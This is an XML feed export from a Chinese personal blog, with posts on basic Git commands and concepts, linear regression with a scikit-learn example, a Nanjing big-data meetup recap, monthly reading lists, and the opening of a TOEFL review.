    <content type="html"><![CDATA[<p>Cover Photo by Ashley Harpp on beanstalk Guides</p><blockquote><p>上次已经介绍了 git 的基本概念和知识，这里我们接着进行学习，本篇主要介绍 git 常用的命令 ，相信你看完之后可以使用 git 创建自己的仓库（或者克隆别人的仓库）、文件上传、提交更改、进行协作… Let`s begin 😎</p></blockquote><p><strong>0x0 目录</strong></p><p>【Git 使用入门（1）】<a href="https://zhililab.github.io/2018/03/19/GitFirstImpression/" target="_blank" rel="noopener">什么是 Git</a><br>【Git 使用入门（2）】<a href="https://zhililab.github.io/2018/04/07/GitSecondImpression/" target="_blank" rel="noopener">Git 常用命令</a></p><p><strong>0x1 初始化配置</strong></p><p>正式开始使用之前，需要配置好 git 的基本信息，例如：用户名、e-mail 地址、颜色等等。</p><p><strong>$ git config –global [user.name][user.email][color.ui][color.status][color.diff]…</strong></p><p><strong>0x2 开始使用</strong></p><p>我们可以新创建一个仓库或者克隆别人的仓库到本地，命令如下：</p><p>1.新建仓库</p><p><strong>$ git init [myprojectname]</strong></p><p><img src="http://f.cl.ly/items/432K2L2y462Z3p2s2a2H/Snipaste_2018-04-07_17-25-07.png" alt="enter image description here"></p><p>2.克隆仓库</p><p><strong>$ git clone [url]</strong></p><p><img src="http://f.cl.ly/items/3C0V31211K0K2T1q0V1M/Snipaste_2018-04-07_17-37-16.png" alt="enter image description here"></p><p><strong>0x3 协作</strong></p><p>1.查看当前版本状态（是否修改）</p><ul><li><strong>$ git status</strong></li></ul><p><img src="https://cl.ly/3e1T0v3Q2n3l/Snipaste_2018-04-08_08-48-39.png" alt="git status"></p><p>2.列出分支</p><ul><li><strong>$ git branch</strong>（列出所有本地分支）</li></ul><p><img src="https://cl.ly/2u0u0t0x2o1R/Image%202018-04-08%20at%208.55.57%20AM.png" alt="列出所有本地分支"></p><ul><li><strong>$ git branch -r</strong>（列出所有远程分支）</li></ul><p><img src="http://f.cl.ly/items/3y0j3L2P1x3N3w3b0y3K/Image%202018-04-08%20at%209.17.39%20AM.png" alt="列出所有远程分支"></p><ul><li><strong>$ git branch -a</strong>（列出所有本地和远程分支）</li></ul><p><img src="http://f.cl.ly/items/1R460K1H3U290a3q0707/Image%202018-04-08%20at%209.18.41%20AM.png" alt="列出所有本地和远程分支"></p><p>3.切换到指定分支</p><ul><li><strong>$ git checkout [x_brach]</strong></li></ul><p><img src="http://f.cl.ly/items/0z1X3k3a052p3h1k1j1M/Image%202018-04-08%20at%209.48.08%20AM.png" alt="切换到指定分支"></p><p>4.新建一个分支，并切换到该分支</p><ul><li><strong>$ git checkout -b [new_branch]</strong></li></ul><p><img src="http://f.cl.ly/items/3B3O3X1G0X1e2R3T083N/Image%202018-04-08%20at%208.59.41%20AM.png" alt="新建一个分支，并切换到该分支"></p><p><strong>0x4 查看</strong></p><p>1.查看当前版本状态（是否修改）</p><ul><li><strong>$ git status</strong></li></ul><p><img src="https://cl.ly/3e1T0v3Q2n3l/Snipaste_2018-04-08_08-48-39.png" alt="查看当前版本状态"></p><p>2.显示提交日志</p><ul><li><strong>$ git log</strong></li></ul><p><img src="http://f.cl.ly/items/0p0k2P3U11302n3E0P1v/Snipaste_2018-04-08_09-03-18.png" alt="显示提交日志"></p><p>3.显示提交日志及相关变动文件</p><ul><li><strong>$ git log –stat</strong></li></ul><p><img src="https://cl.ly/041p0g0g2f37/Image%202018-04-08%20at%209.11.38%20AM.png" alt="显示提交日志及相关变动文件"></p><p>熟话说的好，Practice Makes Perfect ~ 快速下载 git，练练基本的 git 用法吧 🤸‍</p><p><strong>0x5 参考资料</strong></p><ul><li><a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用 Git 命令清单</a></li><li><a href="https://gist.github.com/guweigang/9848271" target="_blank" rel="noopener">git命令大全</a></li><li><a href="https://git-scm.com/video/what-is-git" target="_blank" rel="noopener">Git Basics Episode 2</a></li></ul><hr><p>预告：下次将会介绍一些好用的 git 客户端 😝</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cover Photo by Ashley Harpp on beanstalk Guides&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;上次已经介绍了 git 的基本概念和知识，这里我们接着进行学习，本篇主要介绍 git 常用的命令 ，相信你看完之后可以使用 git 创建自
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Git" scheme="https://github.com/zhililab/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>书单：2018年3月</title>
    <link href="https://github.com/zhililab/2018/04/06/Reading-Books-March-2018/"/>
    <id>https://github.com/zhililab/2018/04/06/Reading-Books-March-2018/</id>
    <published>2018-04-06T05:59:40.000Z</published>
    <updated>2018-06-08T14:25:27.583Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by Kingston Chen on Unsplash</p><p>我的2018年3月的 Kindle 书目一览（含Knotes）：</p><ul><li><p>《巨人的陨落》</p></li><li><p>《码农·“安全”攻防术》</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cover Photo by Kingston Chen on Unsplash&lt;/p&gt;
&lt;p&gt;我的2018年3月的 Kindle 书目一览（含Knotes）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;《巨人的陨落》&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;《码农·“安全”攻防术》&lt;/p
      
    
    </summary>
    
      <category term="读书" scheme="https://github.com/zhililab/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读书" scheme="https://github.com/zhililab/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Git 使用入门（1）</title>
    <link href="https://github.com/zhililab/2018/03/19/GitFirstImpression/"/>
    <id>https://github.com/zhililab/2018/03/19/GitFirstImpression/</id>
    <published>2018-03-19T00:46:32.000Z</published>
    <updated>2018-06-04T05:03:47.869Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by  Ashley Harpp on beanstalk Guides</p><p><strong>0x1 什么是 Git</strong></p><p>Git 是一个当下十分流行的分布式版本控制工具，可以帮助我们有效管理项目开发/文档写作中的版本管理/更新/维护等多种问题，极大的提高了我们的开发效率，同时适用多人协作模式，在我看来，不管是程序员、工程师、作家、学生等等职业，学习、使用 Git 都将会对你的工作/学习/创作起到极大的效率提升作用。</p><p>现在版本控制可以分为三大类：</p><ul><li>LVCS-本地版本控制 e.g. RCS</li><li>CVCS-集中化的版本控制系统  e.g. CVCS / Subversion / Perfoce</li><li>DVCS-分布式版本管理系统 e.g. Git / Bazaar</li></ul><p><strong>0x2 使用 Git 的好处</strong></p><p>Git 的几大优点：</p><ul><li><p>简答易学，容易上手 （这里推荐新手阅读 Scott Chacon 和 Ben Straub 撰写的 <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Pro Git</a> 手册，现在已经有在线中文版 ）</p></li><li><p>完全分布式</p></li><li><p>速度快</p></li><li><p>保证数据完整性。所有数据在更改前都使用 <a href="https://baike.baidu.com/item/sha-1" target="_blank" rel="noopener">SHA-1</a>校验和，保证了所有更改 Git 都知悉。</p></li><li><p>可以高效管理超大规模项目</p></li></ul><p><strong>0x3 基本概念</strong></p><p>正式上手之前，需要明白并记录 Git 的三个文件状态（states）和三个概念（concepts），这对之后地理解、使用 Git 十分重要！</p><ul><li><p><strong>3 个状态</strong> </p><ul><li>comitted: 是“已提交”，这表示所有更改的文件已经安全地存储在你的本地库。</li></ul><ul><li><p>modified: 意思是“已修改”，这意味着你已经更改了你的文件，但还没有提交到你的本地库中。</p></li><li><p>staged: 意思是“已暂存”，你已经在当前版本库中标记了修改地文件，将在出现在。</p></li></ul></li><li><p><strong>3 个概念</strong></p><ul><li><p>Git directory: “Git 仓库”，用来保存项目的元素据（metadata）和对象数据库的地方。Git 体系中最核心的部分。</p></li><li><p>working tree: “工作目录” ，对项目（project）的某个版本（version）单独拷贝、提取。</p></li><li><p>staging area: “暂存区域”，本质上一个文件（file），保存了下词将提交的文件列表信息，一般存放在 Git 仓库中。</p></li></ul></li></ul><p><img src="https://cl.ly/261D2F3g2H1V/Image%202018-03-19%20at%2012.05.42%20PM.png" alt=""></p><p><strong>0x4 参考资料</strong></p><p>[1] <a href="https://git-scm.com/book/en/v2" target="_blank" rel="noopener">Chacon S. Pro Git[J]. 2014</a></p><p>[2] <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">廖雪峰-Git教程</a></p><hr><p>预告：下篇将会介绍 Git 的基本安装、使用命令 ; )</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cover Photo by  Ashley Harpp on beanstalk Guides&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x1 什么是 Git&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Git 是一个当下十分流行的分布式版本控制工具，可以帮助我们有效管理项目开发/文档写作中的
      
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Git" scheme="https://github.com/zhililab/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>书单：2018年2月</title>
    <link href="https://github.com/zhililab/2018/02/01/Reading-Books-Feb-2018-md/"/>
    <id>https://github.com/zhililab/2018/02/01/Reading-Books-Feb-2018-md/</id>
    <published>2018-01-31T16:00:00.000Z</published>
    <updated>2018-06-08T14:25:51.435Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by Kingston Chen on Unsplash</p><p>我的2018年2月的 Kindle 书目一览（含Knotes）：</p><ul><li><p>《Harry Potter and the Philosopher’s Stone》</p><ul><li><p>Everyone expects me to do as well as the others, but if I do, it’s no big deal, because they did it first. You never get anything new, either, with five brothers. I’ve got Bill’s old robes, Charlie’s old wand and Percy’s old rat.’</p></li><li><p>There are some things you can’t share without ending up liking each other, and knocking out a twelve-foot mountain troll is one of them.</p></li></ul></li><li><p>《数据挖掘与数据化运营实战:思路、方法、技巧与应用》</p><ul><li><p>以业务为核心，以思路为重点，以挖掘技术为辅佐”就是该领域的有效成长之路。</p></li><li><p>数据化运营，首先是要有企业全员参与意识;数据化运营，其次是一种常态化的制度和流程，</p></li><li><p>数据分析师和数据分析团队承担了向业务部门及其员工指导、传授有关数据分析和数据探索的能力培养的工作，这是一种授人以渔的崇高行为，值得数据分析师为之奉献。</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cover Photo by Kingston Chen on Unsplash&lt;/p&gt;
&lt;p&gt;我的2018年2月的 Kindle 书目一览（含Knotes）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;《Harry Potter and the Philosopher’s Ston
      
    
    </summary>
    
      <category term="读书" scheme="https://github.com/zhililab/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读书" scheme="https://github.com/zhililab/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>机器学习算法之【线性模型】</title>
    <link href="https://github.com/zhililab/2017/12/10/MachineLearning-LinearModel/"/>
    <id>https://github.com/zhililab/2017/12/10/MachineLearning-LinearModel/</id>
    <published>2017-12-09T16:00:00.000Z</published>
    <updated>2018-06-04T05:05:52.561Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h3><p>线性模型是大家日常学习和工程应用中广泛应用到的一种基本模型，用户刻画数据的规律和趋势。通过线性模型，我们可以对连续变量的值进行预测。此外对于那些非连续型数据，我们也可以通过一些方式将其转化成适合线性拟合的数据形式（如何甄别转换场景）。</p><blockquote><p>基本形式：y = w1x1 + w2x2 + ··· + wnxn + b </p></blockquote><p>其中 xi (i = 1,2,…n) 为变量（属性）， wi (i = 1,2,…n) 变量的权重值</p><p>最简单的线性回归为 —— y = kx + b </p><p>k 称为回归直线的斜率（slope），b 称为回归直线的截距（intercept）</p><a id="more"></a><h3 id="二、核心思想"><a href="#二、核心思想" class="headerlink" title="二、核心思想"></a>二、核心思想</h3><p>核心思想：linear regression 试图学得一个线性模型以尽可能准确地预测输出变量y的实值，为未来进行预测。</p><p>那么问题来了，如何学习并最终确定这条直线呢？</p><p>一般来说，我们会采用最小化均方误差（SSE）和来确定 w 和 b 的值，因为一旦这俩种值确定，整条直线也就确定下来了。</p><p>SSE具体求解有2种方法：</p><ol><li><p>最小二乘法（Ordinary Least Square，OLS）</p><p> 在线性回归中，最小二乘法就是试图找到一条直线，使得所有样本到直线的欧式距离之和最小。</p></li><li><p>梯度下降法（Gradient descent）</p><p> 梯度下降法是一个最优化算法，通常也称为最速下降法。最速下降法是求解无约束优化问题最简单和最古老的方法之一，虽然现已不具有实用性，但是许多有效算法都是以它为基础进行改进和修正而得到的。最速下降法是用负梯度方向为搜索方向的，最速下降法越接近目标值，步长越小，前进越慢。<br> 可以用于求解非线性方程组。</p></li></ol><p>典型场景：</p><ul><li>电力使用预测</li><li>交通流量预测</li><li>在线商铺访问预测</li><li>…</li></ul><blockquote><p>周志华老师还在🍉西瓜书中提到：“线性模式形式简答、易于建模，但却蕴含着机器学习一些重要的基本思想。许多功能强大的非线性模型（nonlinear model）可以在线性模型的基础上通过引入层级结构或高维映射而得”</p></blockquote><h3 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h3><p>这里给出一个 scikit-learn 官方文档的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 导入线性模型包</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model </span><br><span class="line"><span class="comment">## 生成实例 </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reg = linear_model.LinearRegression()</span><br><span class="line"><span class="comment">## 训练</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reg.fit([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2</span>]], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">LinearRegression(copy_X=<span class="keyword">True</span>, fit_intercept=<span class="keyword">True</span>, n_jobs=<span class="number">1</span>, normalize=<span class="keyword">False</span>)</span><br><span class="line"><span class="comment">## 求相关系数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reg.coef_</span><br><span class="line">array([<span class="number">0.5</span>, <span class="number">0.5</span>])</span><br></pre></td></tr></table></figure><p>这个例子虽然简单，但十分清晰了展现如何利用 scikit-learn 从零到一搭建线性模型。</p><h3 id="四、线性模型的-pros-and-cons"><a href="#四、线性模型的-pros-and-cons" class="headerlink" title="四、线性模型的 pros and cons"></a>四、线性模型的 pros and cons</h3><p>pros:</p><ul><li>适合刻画变量之间线性或类线性关系</li><li>擅长连续值预测</li></ul><p>cons:</p><ul><li>线性模型的能力被局限在线性函数里</li></ul><hr><p>参考资料：</p><ol><li>Udacity Machine Learning</li><li>周志华 《机器学习》</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h3&gt;&lt;p&gt;线性模型是大家日常学习和工程应用中广泛应用到的一种基本模型，用户刻画数据的规律和趋势。通过线性模型，我们可以对连续变量的值进行预测。此外对于那些非连续型数据，我们也可以通过一些方式将其转化成适合线性拟合的数据形式（如何甄别转换场景）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基本形式：y = w1x1 + w2x2 + ··· + wnxn + b &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其中 xi (i = 1,2,…n) 为变量（属性）， wi (i = 1,2,…n) 变量的权重值&lt;/p&gt;
&lt;p&gt;最简单的线性回归为 —— y = kx + b &lt;/p&gt;
&lt;p&gt;k 称为回归直线的斜率（slope），b 称为回归直线的截距（intercept）&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="机器学习" scheme="https://github.com/zhililab/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>南京大数据技术 Meetup 第十次会议参会内容回顾与思考</title>
    <link href="https://github.com/zhililab/2017/11/04/Nanjing-BigData-Meetup-10-Review/"/>
    <id>https://github.com/zhililab/2017/11/04/Nanjing-BigData-Meetup-10-Review/</id>
    <published>2017-11-03T16:00:00.000Z</published>
    <updated>2018-06-04T05:05:25.532Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>导语：今天下午去南京大学参加了南京大数据技术 Meetup 第十次会议，收获颇丰，不仅是对机器学习、大数据认识有了提升，而且了解当下大数据、机器学习技术在企业中的前沿应用。晚上回来后（南大仙林好远呀 😭，不过听了这场讲座还是值了），直奔教研室 🏃🏃🏃，想把自己下午参会的所听、所想、所得记录下来。</p></blockquote><h3 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h3><p>南京大学的这个大数据技术 Meetup 是由计算机学院助理研究员、南大大数据实验室的<strong>顾荣</strong>博士发起的 算上加上这次已经举办了 10 次了，特此鸣谢顾荣博士发起并组织大数据技术 Meetup，主要是邀请海内外互联网大数据公司或高等院校学者来给大家带来&amp;分享其最新的<strong>大数据技术</strong>、<strong>学术成果</strong>、<strong>工程实践应用</strong>，可以说是一场产、学、研集一身的“盛会”（虽然自己还是个数据科学“菜鸟”，但能够有机会多听听、多见见还是受益匪浅的。</p><p>这个是本次（第 10 次）<a href="http://www.huodongxing.com/event/6411201406400" target="_blank" rel="noopener">大数据 Meetup 活动详情连接</a>，感兴趣的小伙伴可以看看 o(<em>￣▽￣</em>)ブ</p><a id="more"></a><h3 id="二、主要嘉宾讲演回顾（回忆版）及个人思考-┗-｀O′-┛-嗷"><a href="#二、主要嘉宾讲演回顾（回忆版）及个人思考-┗-｀O′-┛-嗷" class="headerlink" title="二、主要嘉宾讲演回顾（回忆版）及个人思考 ┗|｀O′|┛ 嗷~~"></a>二、主要嘉宾讲演回顾（回忆版）及个人思考 ┗|｀O′|┛ 嗷~~</h3><h4 id="1-大数据时代下的自然语言处理研究进展-via-周德宇"><a href="#1-大数据时代下的自然语言处理研究进展-via-周德宇" class="headerlink" title="1. 大数据时代下的自然语言处理研究进展 via 周德宇"></a>1. 大数据时代下的自然语言处理研究进展 via 周德宇</h4><p>周德宇教授主要从事 NLP 方面的研究，通过周教授的讲述我对 NLP 有了新的认识，比如一般从事 NLP 研究过程如下：</p><p><strong>① 数据预料处理（词性标注 -&gt; 命名实体识别）</strong> -&gt; <strong>② 知识发现（关系抽取/事件抽取）</strong> -&gt; <strong>③ 创建知识图谱</strong> 或 <strong>③ 构建事件图谱（情感计算 / 事件可视化）</strong></p><blockquote><p>周教授说事理图谱是由哈工大的刘挺教授提出了，相对知识图谱更难，但作用很大，很多场合下<strong>事件图谱</strong>更能解决实际问题。有兴趣的小伙伴可以查看相关资料深度了解一下。</p></blockquote><hr><p>周教授的讲座主要分享在三个方面做的研究以及一些实际应用：</p><ul><li><p>关系抽取：周教授带学术做了药物相互作用之间的关系抽取，举个简答的例子，e.g 药物 A 和药物 B 不能和药物C同时使用，我们可以抽取出如下关系表：</p><pre><code>|    关系      |  相互作用与否  || ------------ | ------------  || &lt; A, C &gt;     |     Yes       || &lt; B , C &gt;    |     Yes       || &lt; A , B &gt;    |     No        |</code></pre><blockquote><p>我觉得这个非常有意思，每年有很多因俩种或多种药物不良反应造成的医疗事故，如果我们可以通过这种药物关系抽取出各种不良药物反应的关系，然后绘制知识图谱/事件图谱，然后在医生使用 HIS 系统开药时，智能辅助，是不是可以大大降低因药物不良反应的事故率呢 😉</p></blockquote><p>  此外，周教授还有一个处于研究中的叫做 position-aware relation extraction。</p><p>  这个对比传统的关系抽取方法，主要区别是在分词 part of bags 分词阶段加入单词位置的考虑，简单来说，一句英文不用位置的单词重要性不同，所以英文我们会强调有重读和弱读。不然很长的一句话，别人无法抓住重点，就会造成理解上的障碍。</p></li><li><p>事件抽取：事件抽取方面，周教授主要谈及利用 Topic Model 进行事件抽取方面的研究。</p><p>  Deep Learning 这俩年的超级火爆，利用 LDA 模型进行的研究的人员少了很多，但时周教授发现，Deep Learning 和 AI 占据主流技术的同时，LDA 模型仍然有其用武之地。</p><p>  周教授团队用 Topic Model 把每一个事件用一个 document 表示，然后关联不同 document，进行事件抽取。LDA 我也只了解皮毛，所以我就不阐述了。</p></li><li><p>文本情感分析：做文本情感分析的人很多，但周教授及其团队选取的角度很独特 ———— 针对 Trump 2016 大选事件做 Twitter 用户态度。不仅分析出每条 tweet 的表达 support / disapprove 的态度，更重要的是找出其支持的理由/主题 ，制作图谱 </p><blockquote><p>🔗 去年的《信息传播学》课程实践作业，我爬取了 Trump 和 Hilary 过年一年所有 tweets 作为输入语料 ，利用内容分析法，分析出了其各自主要政治态度、宗教、教育、军事等方面的 <strong>态度</strong> / <strong>观点</strong>。</p></blockquote></li><li><p>实际应用：</p><ul><li>社会舆情采集系统（Spark、Hadoop、MongoDB…）</li><li>…</li></ul></li></ul><h4 id="2-大规模场景下的智能化硬盘故障预警及修复-via-朱颖航"><a href="#2-大规模场景下的智能化硬盘故障预警及修复-via-朱颖航" class="headerlink" title="2. 大规模场景下的智能化硬盘故障预警及修复 via 朱颖航"></a>2. 大规模场景下的智能化硬盘故障预警及修复 via 朱颖航</h4><pre><code>主要通过采集服务器日志信息和多种传感器数据，分析影响硬盘故障的因素和权重，构建一个智能化硬盘故障预警及修复系统。记得吴恩达（Ng Andrew）在 Google 期间，就带领团队利用机器学习分析统计预计 Datacenter 的能耗问题，最终实现了显著的能耗降低。</code></pre><blockquote><p>这里我提了一个问题，就是 LinkedSee 灵犀在IT企业智能化运维除了硬盘故障预警及修复，对于能耗问题是否涉及？朱颖航说他在百度期间就从事了相关的工作，这里面的故事很多 ~~~</p></blockquote><blockquote><p>我还有一点感触就是 ———— 人工智能、机器学习等的应用场景还有很多，我们需要打开思路，发散思维，以全新的视角去审视问题。这个就给我们做了很多的范例。在数据极大丰富、计算能力大幅提升、算法多种多样的今天，我们更加需要深刻理解业务场景、提高问题意识，不断创新问题解决思路、方法，用新工具解决新问题，持续提升效率。</p></blockquote><h4 id="3-企业大数据在风控领域的应用与价值挖掘-via-冯娟"><a href="#3-企业大数据在风控领域的应用与价值挖掘-via-冯娟" class="headerlink" title="3. 企业大数据在风控领域的应用与价值挖掘 via 冯娟"></a>3. 企业大数据在风控领域的应用与价值挖掘 via 冯娟</h4><pre><code>企业大数据不同于以往的社交媒体数据挖掘，而且强调一种“全数据”的概念，包含各种企业公开信息（公司概况、财务、运营数据）、新闻媒体、社交媒体数据、政府监管数据等等。通过挖掘企业的全数据，我们可以绘制公司/企业的“知识图谱”，了解其错综复杂的关系网，利益链，人脉关系网；隐藏着融资风险、非法集资链条等等。</code></pre><hr><p>📌 <strong>企业大数据挖掘建模的几个要素</strong>：</p><ul><li><p>数据和技术要为业务服务 – 领域知识很重要。</p></li><li><p>抽象业务问题，合理定义目标</p></li><li><p>分群建模的重要性。不同的人群特点不同，不可能一个模型/算法通吃。</p></li><li><p>…</p></li></ul><h4 id="4-数据挖掘思维的基础-via-丁明"><a href="#4-数据挖掘思维的基础-via-丁明" class="headerlink" title="4. 数据挖掘思维的基础 via 丁明"></a>4. 数据挖掘思维的基础 via 丁明</h4><pre><code>这次收获或者感悟最多的还是要数丁明带来的《数据挖掘思维的基础》，原因有二：- peer-view 观点，一个从网络运维转型数据挖掘工程师，偶然参加了数据科学竞赛，从此走上数据挖掘道路- 分享的是数据挖掘/数据科学核心的分析思维/逻辑问题，而非传统的技术分享。</code></pre><ul><li><p>数据分析类型</p><ul><li><p>Descriptive Analysis（描述性分析，也就是我们常说的 EDA）：主要通过一些统计分析指标（平均值、众数、方差…）、变量分析（单变量、双变量、多变量）、成分分析探寻数据中一些基本特征、变量关系，为下一步的 predictive analysis 等打下基础，做些基本储备，充分了解数据特征和关系。</p></li><li><p>Diagonal Analysis（诊断性数据分析）：在描述性分析基础上，探寻某些关系、规律背后的影响因素、原因。进一步刻画数据中存在的规律、变化。</p></li><li><p>Predictive Analysis（预测性分析）：根据前俩个分析得出的结论、规律等，进行建模预测，对未来数据变化/用户行为进行预测。</p></li><li><p>Prescriptive Analysis（指导性）：这步主要是面向管理层/高层领导进行的操作，分析师们需要将发现的 <strong>Insights/Ideas</strong> 写成分析报告（包括 Visualization Analysis），以支持上级领导/公司高层进行业务/战略的 <strong>优化/决策</strong>。</p></li></ul></li><li><p>数据挖掘基本流程</p><p>  <strong>数据预处理模块</strong> -&gt; <strong>目标评分公式模块</strong> -&gt; <strong>特征工程模块</strong> -&gt; <strong>Label标签模块</strong> -&gt; <strong>训练模型模块</strong></p></li><li><p>八种常见任务类型</p><ul><li><p>分类</p></li><li><p>回归</p></li><li><p>聚类</p></li><li><p>相似匹配</p></li><li><p>频繁集发现</p></li><li><p>统计（属性、行为、状态）描述</p></li><li><p>连接预测</p></li><li><p>因果分析</p></li></ul></li></ul><blockquote><p>我印象最深刻的一句话是 ———— “我们最终要成为一个模型、算法的分拣器”。我们在了解各种算法后，需要通过大量的训练，获得成为分拣器的实践经验和相应的业务知识/领域知识。 多聆听 👂 多思考 🤔 多实践 🏃</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;导语：今天下午去南京大学参加了南京大数据技术 Meetup 第十次会议，收获颇丰，不仅是对机器学习、大数据认识有了提升，而且了解当下大数据、机器学习技术在企业中的前沿应用。晚上回来后（南大仙林好远呀 😭，不过听了这场讲座还是值了），直奔教研室 🏃🏃🏃，想把自己下午参会的所听、所想、所得记录下来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;一、介绍&lt;/h3&gt;&lt;p&gt;南京大学的这个大数据技术 Meetup 是由计算机学院助理研究员、南大大数据实验室的&lt;strong&gt;顾荣&lt;/strong&gt;博士发起的 算上加上这次已经举办了 10 次了，特此鸣谢顾荣博士发起并组织大数据技术 Meetup，主要是邀请海内外互联网大数据公司或高等院校学者来给大家带来&amp;amp;分享其最新的&lt;strong&gt;大数据技术&lt;/strong&gt;、&lt;strong&gt;学术成果&lt;/strong&gt;、&lt;strong&gt;工程实践应用&lt;/strong&gt;，可以说是一场产、学、研集一身的“盛会”（虽然自己还是个数据科学“菜鸟”，但能够有机会多听听、多见见还是受益匪浅的。&lt;/p&gt;
&lt;p&gt;这个是本次（第 10 次）&lt;a href=&quot;http://www.huodongxing.com/event/6411201406400&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;大数据 Meetup 活动详情连接&lt;/a&gt;，感兴趣的小伙伴可以看看 o(&lt;em&gt;￣▽￣&lt;/em&gt;)ブ&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="https://github.com/zhililab/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Meetup" scheme="https://github.com/zhililab/tags/Meetup/"/>
    
  </entry>
  
  <entry>
    <title>TOEFL Test Review</title>
    <link href="https://github.com/zhililab/2017/10/27/TOEFL-Review/"/>
    <id>https://github.com/zhililab/2017/10/27/TOEFL-Review/</id>
    <published>2017-10-26T16:00:00.000Z</published>
    <updated>2018-03-17T06:12:11.722Z</updated>
    
    <content type="html"><![CDATA[<p>Cover Photo by ETS.org</p><blockquote><p>后天（2017.10.28）我就要参加 TOEFL（ETS）考试了，我想在考试之前系统梳理下 TOEFL 考试流程、内容、一些应试“策略”（我这里不愿称之为技巧）~ OK，那我们正是开始吧！</p></blockquote><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>TOEFL 考试全称为 Test of English as a Foreign Language，中文我们习惯称之为“托福”，举办方是美国重要考试机构 ETS（English Testing System），TOEFL是很多想要出国去英语国家留学、工作必不可少；此外，现在很多人还把 TOEFL 和 IELTS 当成介于 CET-4 、CET-6 和 专业英语等级考试（一般俗称的专四、专八）的一种语言能力证明考试，面试外企或对英语要求高的专业。</p><ul><li><p>报名要求：无要求</p></li><li><p>考试时长： 大陆考区是每周的周六 9：00 开考（ETS有时会根据情况在某个周六的下午增加一场 TOEFL 考试），持续时间一般都是3个小时以上，</p></li></ul><a id="more"></a><p>我们现在参加 TOEFL 基本上都会遇到经典加试（阅读或听力而二者之一），时间也会相应往后顺延，我记得我第一次考完出来时间已经将近下午1点钟了 T_T </p><ul><li><p>考试内容和得分：TOEFL 考试分为四块 —— 阅读、听力、口语、写作，每项满分 30 分，TOEFL考试合计满分 120 分。</p><p>  <a href="http://www.ets.org/toefl/ibt/scores/understand" target="_blank" rel="noopener">TOEFL® Score Scales</a></p><p>  | Skill       |    Score Range |    Level                                                |<br>  | ———– | ———– | —————————————————— |<br>  | Reading     |    0–30        |    High (22–30) Intermediate (15–21) Low (0–14)         |<br>  | Listening   |    0–30        |    High (22–30) Intermediate (14–21) Low (0–13)         |<br>  | Speaking    |    0–30        |    Good (26–30) Fair (18–25) Limited (10–17) Weak (0–9) |<br>  | Writing     |    0–30   